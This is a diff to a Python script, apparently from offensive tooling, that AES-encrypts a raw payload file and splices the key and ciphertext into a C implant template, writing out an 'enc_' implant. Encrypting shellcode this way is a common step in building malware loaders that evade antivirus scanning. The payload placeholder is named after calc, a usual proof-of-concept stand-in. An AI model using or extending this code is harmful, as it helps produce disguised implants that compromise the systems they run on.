@@ -30,13 +30,25 @@ def aesenc(plaintext, key):
 
 try:
     plaintext = open(sys.argv[1], "rb").read()
+    implant = open(sys.argv[2], "r+").read()
 except Exception as e:
     print(e)
-    print("File argument needed! %s <raw payload file>" % sys.argv[0])
+    print("File argument needed! %s <raw payload file> <implant output file>" % sys.argv[0])
     sys.exit()
 
 ciphertext = aesenc(plaintext, KEY)
 #print('key: ', KEY)
 #print('ciphertext: ', ciphertext)
-print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
-print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
+
+
+charKey = 'char key[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
+calc_payload = 'unsigned char calc_payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'
+
+print(charKey)
+print("{}...".format(calc_payload[:65]))
+
+with open("enc_"+sys.argv[2], 'w+') as implantFile:
+    
+    new = implant.replace("char key[] = {};", charKey).replace("unsigned char calc_payload[] = {};", calc_payload)
+    implantFile.write(new)
+    print("[+] enc_{} written with payload!".format(sys.argv[2]))
